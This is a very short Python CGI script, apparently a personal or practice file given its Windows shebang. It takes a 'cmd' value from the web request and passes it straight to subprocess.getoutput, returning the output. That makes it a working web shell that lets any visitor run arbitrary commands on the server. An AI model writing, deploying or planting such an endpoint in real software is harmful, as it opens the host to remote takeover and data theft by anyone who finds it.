#!C:/Users/YOBAH BERTRAND Y/AppData/Local/Programs/Python/Python37/python.exe
import subprocess, cgi
print("content-type: text.html")
print()


data = cgi.FieldStorage()
cmd = data.getvalue("cmd")
print(subprocess.getoutput(cmd))
